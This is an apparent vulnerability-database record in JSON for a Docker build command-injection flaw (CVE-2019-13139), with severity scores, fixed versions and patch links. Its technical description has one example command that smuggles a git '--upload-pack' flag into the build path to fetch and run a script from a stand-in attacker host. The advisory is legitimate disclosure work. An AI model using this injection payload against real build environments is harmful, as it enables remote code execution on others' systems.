{
    "source": "BDSA",
    "name": "BDSA-2019-2711",
    "title": "Docker Vulnerable to Command Execution via Improper Sanitisation of Git Command Line Elements",
    "description": "Docker is vulnerable to arbitrary command execution due to the improper sanitization of elements passed to the git command line tool. If an attacker has control over the build path issued to `docker build` in build environments they could execute arbitrary system commands.",
    "technicalDescription": "Docker does not sanitize certain command line elements passed to the git command line tool. Specifically `git ref` may be interpreted as a flag.  git contains certain flags such as `--upload-pack` that allow for execution of external commands. Therefore the following command could be used for command execution:\n```\ndocker build \"git@github.com/vendor/project#--upload-pack=curl -s attacker.site/exploit.sh|sh;#:\"\n```\n\nAn attacker able to control the build path issued to `docker build` could leverage this for remote command execution.  This would be an unusual scenario; the usual `docker build . -t my-container pattern` is not vulnerable to this.",
    "publishedDate": "2019-08-28T09:39:30.930Z",
    "updatedDate": "2020-07-09T10:52:05.722Z",
    "disclosureDate": "2019-07-16T00:00:00.000Z",
    "exploitPublishDate": "2019-07-16T00:00:00.000Z",
    "solution": "Fixed in Docker CE\n* [**18.09.4**](https://github.com/docker/docker-ce/releases/tag/v18.09.4) by [this](https://github.com/docker/docker-ce/commit/b3b20effb44a62a6f0f3c14ab004c43a72ea565b) commit\n* [**19.03.0-beta1**](https://github.com/docker/docker-ce/releases/tag/v19.03.0-beta1) by [this](https://github.com/docker/docker-ce/commit/d53e44e88751bd2df3c546206fbc0716ae2eaa7c) commit. \n\nFixed in moby \n[**19.03.0-beta1**](https://github.com/moby/moby/releases/tag/v19.03.0-beta1) by [this](https://github.com/moby/moby/commit/a588898f99d697e5ff481ecb3b273f45410f10e6) commit.",
    "severity": "HIGH",
    "cvss2": {
        "baseScore": 5.1,
        "impactSubscore": 6.4,
        "exploitabilitySubscore": 4.9,
        "severity": "MEDIUM",
        "accessVector": "NETWORK",
        "accessComplexity": "HIGH",
        "authentication": "NONE",
        "confidentialityImpact": "PARTIAL",
        "integrityImpact": "PARTIAL",
        "availabilityImpact": "PARTIAL",
        "temporalMetrics": {
            "exploitability": "FUNCTIONAL",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 4.2
        },
        "vector": "(AV:N/AC:H/Au:N/C:P/I:P/A:P/E:F/RL:OF/RC:C)"
    },
    "cvss3": {
        "baseScore": 7.5,
        "impactSubscore": 5.9,
        "exploitabilitySubscore": 1.6,
        "severity": "HIGH",
        "attackVector": "NETWORK",
        "attackComplexity": "HIGH",
        "confidentialityImpact": "HIGH",
        "integrityImpact": "HIGH",
        "availabilityImpact": "HIGH",
        "privilegesRequired": "NONE",
        "scope": "UNCHANGED",
        "userInteraction": "REQUIRED",
        "temporalMetrics": {
            "exploitability": "FUNCTIONAL",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 7.0
        },
        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "credit": "staaldraad",
    "workaround": "",
    "vendorFixDate": "2019-03-27T00:00:00.000Z",
    "bdsaTags": [],
    "overallScore": 7.0,
    "_meta": {
        "allow": [
            "GET"
        ],
        "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2019-2711",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro2.app.blackduck.com/api/cwes/CWE-77"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/CVE-2019-13139",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2019-2711/ranges"
            },
            {
                "rel": "reference",
                "href": "https://github.com/docker/docker-ce/commit/b3b20effb44a62a6f0f3c14ab004c43a72ea565b",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/docker/docker-ce/commit/d53e44e88751bd2df3c546206fbc0716ae2eaa7c",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/docker/docker-ce/releases/tag/v18.09.4",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/docker/docker-ce/releases/tag/v19.03.0-beta1",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/moby/moby/commit/a588898f99d697e5ff481ecb3b273f45410f10e6",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/",
                "label": "EXPLOIT"
            },
            {
                "rel": "default-remediation-status",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2019-2711/default-remediation-status"
            }
        ]
    }
}